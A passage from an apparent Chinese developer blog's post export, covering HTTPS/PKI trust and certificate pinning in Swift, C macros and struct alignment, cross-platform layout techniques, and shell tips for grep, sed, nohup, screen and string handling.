每个域名都有自己的DNS解析服务商，那么需要盗取该域名持有者的DNS服务器商账号密码，才能控制DNS解析 控制主机文件: 可以ssh登录到主机，或者拿下web shell的权限，或者物理接触到服务器主机直接插网线，通过Reset等方式重制密码 至于可以通过何种方式获取到所需业务的账户名和密码，以及如何物理接触到主机，常见的有弱密码破解或者钓鱼邮件等方式，就不展开讨论了 PKI+CERT 体系复盘通过总结，我们可以发现整个 PKI + CERT 安全体系，是需要多方配合的，而且是十分脆弱的 攻击终端的成本比起伪造证书要低很多，不管是 Client 自己操作不当导致终端的 PKI体系 被破坏，还是由于 Server 管理不善造成证书伪造，都有可能进行中间人攻击 实际案例分析证书 HardCode 在App里防止 PKI 被攻击为了防止设备被破解，我们可以通过 SecTrustSetAnchorCertificates 设置PKI列表，通过官方文档可以看到,如果传入NULL则是使用默认的预装证书 12345678910111213141516171819202122//A reference to an array of SecCertificateRef objects representing the set of anchor certificates ......//.....................Pass NULL to restore the default set of anchor certificates. func mockCACertValid() -&gt; SecTrustResultType &#123; //Read Cert From File let certData = try! Data(contentsOf: URL(fileURLWithPath: &quot;path&quot;)) as CFData let certificateRoot = SecCertificateCreateWithData(nil, certData)! //Create CertChain let certArray = [certificateRoot] let policy = SecPolicyCreateBasicX509() //Create Trust(Or From URLSession) var optionalTrust: SecTrust? SecTrustCreateWithCertificates(certArray as CFTypeRef, policy, &amp;optionalTrust) //Set Anchor Cert SecTrustSetAnchorCertificates(optionalTrust!, certArray as CFArray) //Begin Valid var result: SecTrustResultType = .invalid SecTrustEvaluate(optionalTrust!, &amp;result) return result &#125; 固件升级签名验证固件升级验签应该在哪里，固件是由网络下载到终端，安装前为了防止固件被修改过，肯定需要验证这个固件的签名，按照逻辑终端PKI本身是可能被攻击的，所以选择网络验证签名 Glance123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 +------------------------+ +------------------------+ | | | | | | | | | Chrome | | Server | | | | | | | | | | | | | +------------------------+ +------------------------+ | | | http:&#x2F;&#x2F;www.domain.com | +-------------------------------&gt; | +-------------------------+ | | | | | Nginx Listen 80 | | | Return 301 https:&#x2F;&#x2F;host:url | +----------------------+ | &lt;--------------------------------------------------------------+ | http code | | | 301 | | | | https:&#x2F;&#x2F;www.domain.com | +----------------------------------------------------&gt; | +-------------------------+ | | Nginx Listen 443 SSL | | | send : full_chain.pem | | | | | full_chain.pem contain: | | | (server.pub domain.com CA.sign) | | | | |+-----------------------------------------+ | &lt;---------------------------------------------------------------+| PKI: CA.pub | || valid full_chain.pem CA.sign | || key_gen: chrome.pub chrome.pri | || encrypt: chrome.pub(by server.pub) | https:&#x2F;&#x2F;www.domain.com || send: chrome.pub.en chrome.sign | body: chrome.pub.en || keep: !!! chrome.pri !!! | (only can decrypt by server.pri) || | |+----------------------------------------------------------------------&gt; | +-------------------------+ | | Nginx Listen 443 SSL | | | read : server.pri | | | decrypt: chrome.pub | | | valid: chrome.sign | | !! COMPLETE PUBLIC KEY EXCHANGE !! | | | | +-------------------------+ | | XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX | +---------------------------------+ | | | prepare: message | | | encrypt: use server.pub | message.en | | send: message.en | (only can decrypt by server.pri) | | | | +--------------------------------------------------------------&gt; | +--------------------------+ | | receive: message.en | | | decrypt: use server.pri | | | prepare: response | | response.en | encrypt: use chrome.pub | | (only can decrypt by chrome.pri) | send: response.en | | | | +---------------------------------+ | &lt;---------------------------------------------------------------+ | receive: response.en | | | decrypt: use chrome.pri | | | | | | WELL DONE!! | | | | | +-----------------------------------------&gt; | | | Security Mind Mapping","tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"http://yoursite.com/tags/HTTPS/"}]},{"title":"C语言高级宏定义关键字和操作符","date":"2019-02-01T15:00:00.000Z","path":"2019/02/02/C语言高级宏定义关键字和操作符/","text":"宏宏在很多语言里都有，是一种预处理（Preprocessor）阶段的流程的能力，预处理主要知识包含 条件（conditionally）、替换（replace）、包含（include）、错误（error）、实现定义（implementation defined）、文件和行定义（file name and line information） 宏的作用主要是替换（replace）其灵活性极高可读性极差，不太推荐使用过于复杂的技巧，可以拆分为以下几点 定义 操作符 定义宏的定义可以分为 Object-like macros 和 Function-like macros, 一种类似变量的定义一种类似方法的定义 123456#define identifier replacement-list(optional) (1) #define identifier( parameters ) replacement-list(optional) (2) #define identifier( parameters, ... ) replacement-list(optional) (3) (since C++11)#define identifier( ... ) replacement-list(optional) (4) (since C++11)#undef identifier (5) 可以看到 Function-like macros 定义中最关键的点在于可变参数 C语言可变参数和宏定义的多参数C语言本身 stdarg.h 头文件提供可变参数的能力，例如print函数是一个典型的应用 1double average(int num,...) 宏本身也具备和C语言类似的可变参数能力，只需要在宏定义中包含关键词 VA_ARGS 1#define AVERAGE(...) average(__VA_ARGS__) 即可表达可变参数的传递 操作符在 Function-like macros 中除了关键词，还包含以下主要的操作符 操作符 符号 作用 “Stringification” # 如果在 replacement-list 的某个 identifier添加操作符 “Concatenation” 、”Token Pasting” ## Stringification 的作用根据官方文档原文，字符串化操作符的主要作用是使用双引号把某个定义括起来，以字符串解析出来进行展开（Expand） 1a # operator before an identifier in the replacement-list runs the identifier through parameter replacement and encloses the result in quotes 一个简单的举例, 其字符串化某个 identifier 时，如果identifier本身就是字符串，则不会有任何影响 1234567#define showtext(num) puts(#num)#define shownumber(num) puts(num)showtext(&quot;1&quot;) &#x2F;&#x2F; expands to puts(&quot;1&quot;)showtext(1) &#x2F;&#x2F; expands to puts(&quot;1&quot;)shownumber(1) &#x2F;&#x2F; expands to puts(1) 一个关键的点在于，如果和可变参数__VA_ARGS__共同使用时，会将整个可变参数变为一个字符串参数 123#define showlist(...) puts(#__VA_ARGS__)showlist(); &#x2F;&#x2F; expands to puts(&quot;&quot;)showlist(1, &quot;x&quot;, int); &#x2F;&#x2F; expands to puts(&quot;1, \\&quot;x\\&quot;, int&quot;) Concatenation 的作用链接操作符的作用主要是将还未展开的先切断replacement-list，对前后的identifiers分别进行展开然后再拼接到一起，原文如下 1A ## operator between any two successive identifiers in the replacement-list runs parameter replacement on the two identifiers (which are not macro-expanded first) and then concatenates the result. 这个操作符需要注意的地方是，操作符前后的定义必须是已知的identifiers，不然会报错，大多数中文博客将其理解成 “将宏定义中的多个参数连接形成一个参数” 12#define showtext(x,y) puts(x##y)showtext(var,123) &#x2F;&#x2F;expands to puts(var123) 非常规的操作符还存在两种并不是所有编译器都支持的操作符 “#@” 和 “# #” 这里就不展开介绍了","tags":[{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"C语言位域和字节对齐相关问题","date":"2019-01-31T15:00:00.000Z","path":"2019/02/01/C语言位域和字节对齐相关问题/","text":"Bit和Byte的关系曾经有个师哥问我32位系统和64位系统中一个字节分别对应几位。 当时我还没毕业，想你说的什么玩意儿。。 写了一年多传输层的代码之后才牢牢记住，无论哪个系统一个字节永远都对应8位。 字节 = byte， 位 = bit， 1byte = 8bit byte是计算机的最小储存单位，bit为计算机的最小逻辑单位 32位CPU代表每次（不是每秒）CPU可以运算32个0/1逻辑，64位则是64个 位域 （Bit Field）在TCP层经常会使用到少于一个byte (8bit) 的标记位，因为计算机储存的最小单位是byte 所以需要对byte拆分的时候就会用到位域 1234567891011121314151617181920212223//定义一个仅占用1byte 的结构体//使用前4个bit 代表 first//使用后4个bit 代表 secondstruct value&#123; uint8_t first : 4; uint8_t second : 4;&#125;;int main() &#123; //初始化 value v = &#123;1, 1&#125;; std::cout &lt;&lt; &quot;value: first = &quot; &lt;&lt; (int)v.first &lt;&lt; std::endl; std::cout &lt;&lt; &quot;value: second = &quot; &lt;&lt; (int)v.second &lt;&lt; std::endl; //赋值测试 v.first = 20; v.second = 15; std::cout &lt;&lt; &quot;assgin 20 value: first = &quot; &lt;&lt; (int)v.first &lt;&lt; std::endl; std::cout &lt;&lt; &quot;assgin 15 value: second = &quot; &lt;&lt; (int)v.second &lt;&lt; std::endl;&#125; 分析输出我们会发现 当小于 2^4 = 16 时，数字都可以正常的被转化成int 当大于 2^4 = 16 时，因为越界，结果会被减去16 12345value: first &#x3D; 1value: second &#x3D; 1assgin 20 value: first &#x3D; 4 &#x2F;&#x2F;越界的地方assgin 15 value: second &#x3D; 15 字节对齐字节对齐是另一个常见问题，原因在于CPU为了提高效率，会利用一些冗余空间把字节对齐成某个固定值的整数倍 但是对于我们操作byte结果很不方便，比如以下三个结构体在内存中占用的空间 1234567891011121314151617181920212223242526//char 位于 int 之前struct value_1&#123; char c; int i;&#125;;//char 位于 int 之后struct value_2&#123; int i; char c;&#125;;//使用1字节对齐#pragma pack(1)struct value_3&#123; int i; char c;&#125;;//恢复默认字节对齐#pragma pack() 通过对sizeof来看他们在内存中实际占用的空间，例如 123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;sizeof char : &quot; &lt;&lt; sizeof(char) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof int : &quot; &lt;&lt; sizeof(int) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof short : &quot; &lt;&lt; sizeof(short) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof double : &quot; &lt;&lt; sizeof(double) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof &#123; char int &#125; : &quot; &lt;&lt; sizeof(value_1) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof &#123; int char &#125; : &quot; &lt;&lt; sizeof(value_2) &lt;&lt; endl; cout &lt;&lt; &quot;sizeof pack(1) &#123; int char &#125; : &quot; &lt;&lt; sizeof(value_3) &lt;&lt; endl; return 0;&#125; 分析输出，首先打印基本类型在内存中的空间 char(1byte = 8bit), int(4byte = 32bit), short(2byte = 16bit), double(8byte = 64bit) 然后无论 value_1 还是 value_2 无论我的数据组成顺序，都是 8byte &gt; 1byte + 4byte (char + int) 这种利用3byte的冗余空间来保存结构体的优化，就是称为字节对齐，字节对齐的规则一般是使用整个结构体中最长的那个 如果我们声明使用 pack(1) 使用1byte进行对齐，则可以获得不包含冗余空间的内存结构 5byte = 1byte char + 4byte int 1234567sizeof char : 1sizeof int : 4sizeof short : 2sizeof double : 8sizeof &#123; char int &#125; : 8sizeof &#123; int char &#125; : 8sizeof pack(1) &#123; int char &#125; : 5","tags":[{"name":"C","slug":"C","permalink":"http://yoursite.com/tags/C/"}]},{"title":"Android/iOS/Web布局对比解析","date":"2018-12-31T15:00:00.000Z","path":"2019/01/01/AndroidiOSWeb布局对比解析/","text":"Github代码参考 GitHub-LayoutSample 布局 界面 要求 Red 1. 与屏幕等宽2. 高度100px(dp)3. 位于底部 Yellow 1. 与屏幕等宽2. 高度占比20%3. 位于Red上方 Blue 1. 与屏幕等宽2. 高度可拉伸至填满屏幕3. 位于Yellow上方 Fix 1. 固定宽高2. 水平分布于Red3. 四个水平间距自由拉伸、相等、填满屏幕宽度 Stretch 1. 宽高都可以拉伸2. 水平分布于Yellow3. 四个水平间距、两个上下间距固定 Image 1. 宽高都是Blue的50%2. 位于Blue水平垂直中心3. 两个水平间距、两个上下间距拉伸 代码组成根据不停的平台，尽量尝试了不同的功能模块来实现进行对比 平台 功能模块 iOS 1. AutoLayout(Anchor) Android 1. ConstraintLayout 2. LinearLayout 3. RelativeLayout Web 1. FlexLayout iOS细节特点核心公式 first = second × Multiple + Constant 在iOS的 AutoLayout 中，大部分间距计算依赖于屏幕尺寸，无法在ViewDidLoad完成，例如Red+Fix 但是使用了 StackView 或者使用一个 Container 来处理，就可以规避这个问题 基本界面思路 约束RedView的高为100，并且左、右、下三个边距贴紧屏幕 约束YellowView的高为屏幕高度的0.2倍，并且左、右两个边距贴紧屏幕、下边距贴紧RedView的上边距 约束BlueView的左、右、上三个边距贴紧屏幕，下边距贴紧YellowView的上边距 约束ImageView中心点X、Y等同于BlueView，并且约束其宽、高均为BlueView的50% 而黄色和红色内部的布局是iOS的界面思路难点 要满足红色内固定元素的要求，根据AutoLayout远离，我们需要知道间距的大小 需要间距的大小导致必须在 ViewController 已经探测到实际Frame后才能计算出来 或者可以换一种思路，可以 避开对RedView宽度已知的要求 三个Container直接均分整个宽度 然后在 Container 的中心放置FixView 对于黄色内部布局思路难点在于 已知整个宽度上被固定间距占去的大小为 4*Gap 剩下的宽度要由三个Stretch均分 那么左右的 Stretch 的宽度为 1/3屏幕宽度减去 1.5倍的间距 中心的 Stretch 中心 X 坐标一定等于YellowView，而宽度为 1/3屏幕宽度减去一个间距 被减去的间距一共是 1.5+1+1.5 = 4 Android细节特点LinearLayout的权重公式 Weight × (Parent - Constant)/SumWeight 与 ConstraintLayout 不同 RelativeLayout 无法按百分比约束Image 如果使用 PureCode 进行 Layout 需要严格的生命周期和id，需要注意一下几点 View.inflate() 第三个属性不能是root，因为设置的id没有生效，导致 ConstraintSet 无法生效 设置id 有两种方式，写在XML里或者通过属性设置 对于不设置 id 的 View 在 ConstraintSet 里会导致Crash 基本界面思路 使用ConstraintLayout来对R、Y、B三个View进行布局 使用LinearLayout来对RedView、YellowView的内部进行布局 使用RelativeLayout来对BlueView的内部进行布局 通过配置XML的attribute处理Red、Yellow、Blue的布局 设定ConstraintLayout的宽高均为 match_parent 来获得屏幕大小 设定R、Y、B的 layout_width=”match_parent” 来获取和屏幕等宽 设置Y、B的 layout_height=”0dp” 来让高度约束生效 设定RedView的 Bottom_toBottomOf=”parent”、layout_height=”100dp” 获得固定高度对其底部 设定YellowView的 Bottom_toTopOf=”@id/red”、constraintHeight_percent=”0.2” 获得屏幕20%高度，并且贴近Red顶部 设定BlueView的 Top_toTopOf=”parent”、Bottom_toTopOf=”@id/yellow” 来填充剩余空间 然后通过LinearLayout来处理Fix 设定 LinearLayout 的 orientation=”horizontal” 来获取水平布局 依次间隔排列四个 space 元素 和 3个 view 元素 设定每个view元素的 layout_gravity=”center” 使其在 vertical 方向居中 设定每个view元素的宽高为固定大小 设定每个space元素的 layout_width=”0dp”、layout_height=”0dp”使其宽高均可自适应 设定每个space元素的 layout_weight=”1” 代表其布局权重为1 所有7个元素的权重排列为 1 0 1 0 1 0 1 由于view有固定宽高，当RedView的宽度减去三个固定的Fix宽度后，剩余宽度按权重分配给space元素 每个 space 获得的宽度为 1/(1+0+1+0+1+0+1) = 1/4 然后通过LinearLayout来处理 Stretch 设定 LinearLayout 的 orientation=”horizontal” 来获取水平布局 依次间隔排列四个 space 元素 和 3个 view 元素 设定每个 space 的 layout_width=”10dp”、layout_height=”0dp” 来固定宽度和高度自适应 设定每个 view 的 layout_weight=”1” 来获得剩余宽度的分配权重 设定每个 view 的 layout_width=”match_parent”、layout_height=”match_parent” 来尽量拉伸 设定每个 view 的 margin-top 和 margin-bottom 为10dp获取上下间距 所有7个元素的权重排列为 0 1 0 1 0 1 0 由于 space 有固定宽度， 当 YellowView宽度减去四个space的宽度后，剩余宽度按权重分配 每个 view 获得的宽度为 1/（0+1+0+1+0+1+0）= 1/3 最后处理图片元素，图片元素布局推荐使用 ConstraintLayout ，这里使用 RelativeLayout 来对比两者区别 设定 image 元素 layout_centerInParent=”true” 来达到居中效果 和 ConstraintLayout 区别在于，无法使用百分比约束宽高 Web细节特点FlexLayout拉伸权重公式 Weight × MAX(Parent, (Parent - Constant))/SumWeight 和 Android、iOS 不同， Web 主页面 Scroll 因为可以无限滚动不存在屏幕尺寸边界，所以使用 100vh（Visual Height） 来限制高度，vh代表可视区域 在间距问题上，不同于 iOS 和 Android， FlexLayout 有CSS属性 justify-content: space-evenly 可以专门来处理间距 FlexLayout 和 AndroidLinearLayout 都存在权重的概念，但是有细微的差别 基本界面思路 设定一个 Container Div 的Height等于100vh（100 Visual Height） 如果没有 Container Div 无法获取到屏幕下边缘，因为Web页面是可以无限延展的（除非使用Float） Red、Yellow、Blue 三个呈上下排列，所以应该使用 flex-direction: column 由于 flex-direction: column Red、Yellow、Blue 的 flex 约束的是 height flex布局的难点在于理解权重的作用，权重分为拉伸权重（grow）和缩小权重（shrink），使用 flex: grow shrink number 来表达 设置 Red 的 flex: 0 1 100px 代表grow = 0 不能拉伸，shrink = 1 缩小权重为1， 固定 100px 的 height 设置 Yellow 的 flex: 0 1 20vh 代表不能拉伸，缩小权重为1，固定20%可视屏幕宽度的高 设置 Blue 的 flex: 1 1 auto 代表拉伸权重为1 缩小权重为1 高度auto 由于grow权重的分配 R:Y:B = 0:0:1 就代表 Red、Yellow不会改变大小，而Blue占剩余空间的 1/(0+0+1) = 1 由于shrink权重的分配 R:Y:B = 1:1:1 就代表 Red、Yellow、Blue各占剩余空间（也是总空间）的 1/(1+1+1) = 1/3 从R、Y、B的权重分析我们可以看到，在某个 display:flex 的布局中，布局的思路就是 整个flex的总空间 - 固定空间 = 剩余空间 在剩余空间有冗余的时候，按照权重来放大和缩小 如果想固定长度，就把权重设置为 0 完成了Red、Yellow、Blue的布局后，接下来开始处理 Fix 为了完成Fix的效果，需要RedView属性和子元素Fix属性 互相配合 设置RedView的 display: flex ，其默认 flex-direction 为 row 当RedView的 flex-direction=row 时, 其 cross-axis 即为 column 方向 设置RedView的 align-items: center 保持内部子元素在cross-axis为水平 设置RedView的 justify-content: space-evenly 来控制子元素间距 设置子元素class fix的 width: 80px height 80px 来保持固定大小 接下来开始处理Stretch属性 为了完成Stretch的效果，需要YellowView属性和子元素Stretch属性互相配合 设置YellowView的 display: flex ，其默认 flex-direction 为 row 设置子元素Stretch的属性 flex: 1 1 auto 代表拉伸缩小权重均为1 宽度自适应 设置子元素Stretch的属性 height: auto 代表高度也自适应 根据flex权重分配，三个Stretch的均占用 1/(1+1+1) = 1/3的row向mian-axis空间 调整不同位置Stretch的margin，来达到固定间距10px的效果 最后对图片的位置进行处理 为了完成图片居中并且正方形的效果，需要BlueView和图片子元素互相配合 设置BlueView的 display: flex 设置BlueView的 align-items: center; justify-content: center; 达到居中效果 使用百分比设置图片 width: 50% 来使用 BlueView 一半的宽度 使用 object-fit: cover 来使图片达到正方形Square的效果","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Android","slug":"Android","permalink":"http://yoursite.com/tags/Android/"},{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"}]},{"title":"Shell三连(十六)：查询本机的Xcode证书","date":"2018-12-15T15:00:00.000Z","path":"2018/12/16/Shell三连16查询本机的Xcode证书/","text":"显示可以用于签名的证书fastlane 列出这个指令来输出所有可以用于签名的证书，参数的解释 -v: 输出有效的签名 -p: 输出的策略policy 用于签名 codesigning 1xcrun security find-identity -v -p codesigning 输出这个证书的详细信息但是这个指令看不到证书的详细信息，我们可以通过另外一个指令 find-certificate 摘出 -a: 全部的证书 -c: 过滤关键词 iPhone -p: 以pem格式输出 1xcrun security find-certificate -a -c &quot;iPhone&quot; -p | openssl x509 -text | grep &quot;Subject:&quot; 因为输出的是pem格式，可以通过 openssl 转化为可读的text，然后摘取出 Subject: 的内容 1Subject: UID=LURE22***, CN=iPhone Developer: **** li (NMJ****R), OU=XAU86******, O=****** , C=US 使用KeyChain找到这个证书可以看到 UID = User ID, CN = Common Name, OU = Organizational Unit, O = Organization, C = Country or Region","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十五)：自动补全Framework的头文件","date":"2018-12-14T15:00:00.000Z","path":"2018/12/15/Shell三连15自动补全Framework的头文件/","text":"自动补全Framework的头文件写OC的Framework的时候最尴尬的就是要整理所有的头文件到 Umbrella-Header 里 这里脚本来帮忙自动添加，只需要加入到 Build Phase 里就行了 UMBRELLA_FILE: 哪个文件是Umbrella-Header，默认是Target的同名头文件 PROJECT_FILE: 工程文件在哪，需要去project里查询哪些头文件Public 1234567891011121314151617181920212223# TARGETNAME=&quot;AutoHeader&quot;# UMBRELLA_FILE=&quot;..../AutoHeader/AutoHeader.h&quot;# PROJECT_FILE=&quot;..../AutoHeader/AutoHeader.xcodeproj/project.pbxproj&quot;UMBRELLA_FILE=&quot;$SOURCE_ROOT/$TARGETNAME/$TARGETNAME.h&quot;PROJECT_FILE=&quot;$PROJECT_FILE_PATH/project.pbxproj&quot;# Remove exist #importgrep -v &quot;#import&lt;$TARGETNAME&quot; &quot;$UMBRELLA_FILE&quot; &gt; &quot;$UMBRELLA_FILE.backup&quot;# Extract public headers# Find publicgrep -E &quot;ATTRIBUTES = \\(.*Public,&quot; $PROJECT_FILE | \\ # Take out file namegrep -oE &quot;\\/\\* .* in Headers \\*\\/&quot; | \\# Replace with #import&lt;&gt;sed &quot;s/\\/\\* /#import&lt;$TARGETNAME\\//; s/ in Headers \\*\\//&gt;/&quot; | \\# Remove umbrella selfgrep -v &quot;$TARGETNAME/$TARGETNAME.h&quot; \\&gt;&gt; &quot;$UMBRELLA_FILE.backup&quot;# Replace umbrella headermv &quot;$UMBRELLA_FILE.backup&quot; &quot;$UMBRELLA_FILE&quot;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十四)：指令grep取行号","date":"2018-12-13T15:00:00.000Z","path":"2018/12/14/Shell三连14指令grep/","text":"本文使用 /etc/hosts 大家都有的Host文件作例子，具体指令的参数可以使用 man 来查看 grep取行号比如想取到 “127.0.0.1 localhost” 在文件的第几行 1grep -Fn &quot;127.0.0.1&quot; /etc/hosts | cut -d &quot;:&quot; -f1 | head -n 1 grep过滤和反向过滤通常用于处理日志，过滤包含localhost的行 1grep &quot;localhost&quot; /etc/hosts 反向过滤 1grep -v &quot;localhost&quot; /etc/hosts","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十三)：指令sed处理字符串","date":"2018-12-12T15:00:00.000Z","path":"2018/12/13/Shell三连13指令sed/","text":"本文使用 /etc/hosts 大家都有的Host文件作例子，具体指令的参数可以使用 man 来查看 sed替换和删减文件中存在多个localhost，想把 “localhost” 替换成 “localhost2” 1sed &quot;s/localhost/localhost2/&quot; /etc/hosts 想删除 “127.0.0.1 localhost” 中的IP地址，代表从以127.0.0.1开头的行的，127.0.0.1的部分替换成空 1sed -E &quot;s/^127.0.0.1//&quot; /etc/hosts 删除domain部分 1sed -E &quot;s/localhost$//&quot; /etc/hosts 指定sed的作用范围在替换localhost的时候，会误伤 ::1 localhost的部分，可以通过限定 address来避免 通过行号指定地址，只作用于第七行 1sed -E &quot;7,7s/localhost//1&quot; /etc/hosts 通过内容来限定 1sed -E &quot;/^127.0/,/^255.255/s/localhost//1&quot; /etc/hosts sed连续执行命令想先把 “127.0.0.1 localhost” 中localhost替换成 other localhost ，然后把 other local 替换成 net 因为第二部需要第一步的结果，可以通过sed连续指令,连续指令用分号分割 1sed -E &quot;7,7s/localhost$/other localhost/;s/other local/net/&quot; /etc/hosts","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十二)：Shell开启后台任务","date":"2018-12-11T15:00:00.000Z","path":"2018/12/12/Shell三连12开启后台任务/","text":"关闭Terminal为什么会中断根据IBM科普文章任何一个Terminal窗口连接上服务器都会存在一个进程(Process)，并且存在一个会话（Session）在此线程下 可以使用ps -f 查看, 其中f参数的意思为打印出 PID(Process ID), PPID(Parent Process ID) 1-f Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty...... 那么如果关闭Terminal或者网络链接断开，会有一个SIGHUP信号发送到该线程，让此PID下的所有任务中止 什么是SIGHUP信号SIGHUP信号是众多POSIX信号的一个, 像程序Crash时常见的两个信号 SIGABRT （”abort”, abnormal termination.） 和 SIGSEGV （ “segmentation violation”, invalid memory access.） 都属于同类 12hangup 名称的来由在 Unix 的早期版本中，每个终端都会通过 modem 和系统通讯。当用户 logout 时，modem 就会挂断（hang up）电话。 同理，当 modem 断开连接时，就会给终端发送 hangup 信号来通知其关闭所有子进程。 如何躲避Hang Up（HUP）信号躲避SIGHUP一般分为两个策略 直接屏蔽SIGHUP信号，使用nohup命令 让某个命令运行在另外一个PID下，使用setsid命令,或者直接使用 (shell &amp;) 1234nohup - run a command immune to hangups, with output to a non-ttysetsid - run a program in a new session 使用nohup指令的要点 命令的stdout会默认存在 nohup.out 中, 也可以重定向到其他文件 nohup本身只是中断信号，并不会让出当前termianl的stdin，所以要在结尾加入 &amp; 123nohup ping www.ibm.com &amp; 使用setsid指令的要点使用setsid可以让命令运行在另外一个进程里，或通过()可以让某些命令直接运行在子进程立，作用和setsid是一样的 12345setsid ping www.ibm.com(ping www.ibm.com &amp;) 可以通过ps指令查看 pid 和 ppid 之间的关系 12345ps -ef |grep www.ibm.com#UID PID PPID C STIME TTY TIME CMD#root 31094 1 0 07:28 ? 00:00:00 ping www.ibm.com#root 31102 29217 0 07:29 pts/4 00:00:00 grep www.ibm.com 如果处理已经开始执行的命令如果一个指令已经开始运行，无法使用 nohup 和 setsid 来躲避SIGHUP信号，需要使用另外一个指令 disown 用disown -h jobspec来使某个作业忽略HUP信号 用disown -rh 来使正在运行的作业忽略HUP信号 还需要使用到组合命令包括 CTRL+Z ： 挂起（Suspend）就是临时暂停当前stdout中在执行的任务 jobs ： 查看当前有哪些任务在运行 bg ： 把某个任务放入后台，但是并没有对SIGHUP进行处理 %1 ： jobspec 任务描述符，用来指定任务 那么我们可以通过以上指令的组合，来达到让某个任务躲开SIGHUP 1234567891011121314151617181920# 执行一个任务ping www.ibm.com &gt; log.txt# 挂起任务 CTRL+Z^z[1]+ Stopped ping www.ibm.com &gt; log.txt# 一般来讲挂起任务会直接看到 jobspec, 也可以再次查询jobs# 让某个 jobspec 躲避 SIGHUPdisown -h %1# 放入后台继续执行bg %1# 再次执行 jobs 可以看到状态从 Stopped 变成 Runningjobs[1]+ Running ping www.ibm.com &gt; log.txt &amp; 一劳永逸使用screen命令产生虚拟终端Screen命令可以创建一个虚拟终端，相当于不用重新链接再开一个终端了，需要用到遗下四个指令 screen -dmS name ：创建一个虚拟终端。 screen -list ： 来列出所有会话。 screen -r name ： 来重新连接（Attach）指定会话。 CTRL+A D ： 组合快捷键从虚拟终端暂时断开(Detach) 12345678910111213141516171819# 创建一个test的虚拟终端screen -dmS test# 查看创建的终端screen -list # 重新链接进入创建的终端screen -r test# 执行指令ping www.ibm.com# 使用快捷键CTRL+A D 暂时Detach当前终端, A D 依次按下^A D# 再次查看终端screen -list 从第一个指令参数 -dmS 代表以下三个含义 123456# -d 从创建的Terminal detach出来-d Detach the elsewhere running screen # -m 创建一个新的session-m ignore $STY variable, do create a new screen session.# -S 使用组合 PID.name 代替默认的名称-S Name this session &lt;pid&gt;.sockname instead of &lt;pid&gt;.&lt;tty&gt;.&lt;host&gt;.","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十一)：字符串转Int","date":"2018-12-10T15:00:00.000Z","path":"2018/12/11/Shell三连11内置函数字符串处理/","text":"内置函数介绍除了使用Sed操作字符串之外，还可以使用内置函数来操作字符串 exper: 除了可以用来操作字符串，还可以用来做数据运算 ${}符号: 主要是用来操作字符串 字符串长度123456string=abcABC123ABCabc# 此处是小括号echo $(expr length $string)# 此处是中括号echo $&#123;#string&#125; 字符串删减字符串删减可以直接使用内置函数 ${string#$substring} 需要考虑两个维度 从start/end哪个进行删除，#代表start，%代表end 删除最长/最短匹配，#、%代表最短， ## %%代表最长 需要注意其中substring使用的不是正则表达式，而是字符串匹配 1234567891011string=abcABC123ABCabc#删除左边的 abcABCecho $&#123;string#a*C&#125;#删除左边的 abcABC123ABCecho $&#123;string##a*C&#125;#删除右边的 ABCabcecho $&#123;string%A*c&#125;#删除右边的 ABC123ABCabcecho $&#123;string%%A*c&#125; 字符串替换内置函数还提供了类似sed的替换功能，也要考虑两点 单次/全部替换 从前开始替换还是从后开始替换 ${string/string/substring} 12345678910string=abcABC123ABCabc#替换abc为XYZecho $&#123;string/abc/XYZ&#125;#替换全部abcecho $&#123;string//abc/XYZ&#125;#从start开始替换echo $&#123;string/#abc/XYZ&#125;#从end开始替换echo $&#123;string/%abc/XYZ&#125; 字符串提取使用表达式 ${string:position:offset} 进行提取，注意两点 offset可以省略，代表提取到末尾 position为负时需要加括号或者空格，进行反向提取 1234567891011string=abcABC123ABCabc# 左边提取 BC123ABCabcecho $&#123;string:4&#125;# 右边提取 Cabcecho $&#123;string:(-4)&#125;echo $&#123;string: -4&#125;# 偏移提取 123echo $&#123;#string:6:3&#125; 第二种方式是使用expr进行提取，可以用postion也可以用正则来 expr substr $string $postion $length expr match $string “($regex)“ 注意当使用match的时候，需要满足三点：加双引号、转义小括号、使用正则，其中如果使用另外一种表达, 则代表从end of string 进行提取，一般是右边 **expr match $string “.*()“ ** 也可以使用分号来代替 match 命令 expr $string : “($regex)“ 1234567891011string=abcABC123ABCabc#左边提取abcexpr substr $string 1 6expr match $string &quot;\\([a-Z]*\\)&quot;expr $string : &quot;\\([a-Z]*\\)&quot;#右边提取abcexpr substr $string 10 6expr match $string &quot;.*\\([a-Z]\\&#123;6\\&#125;\\)&quot;expr $string : &quot;.*\\([a-Z]\\&#123;6\\&#125;\\)&quot; 资料来源参考的说明有英文文档、菜鸟、CSDN博客","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"}]},{"title":"Shell三连(十)：字符串转数字","date":"2018-12-09T15:00:00.000Z","path":"2018/12/10/Shell三连10字符串转数字/","text":"算数运算符根据StackOverflow的回答可以使用算数运算符 (( )) 来执行算术逻辑 12345count=0echo $count(( $count+1 ))echo $count 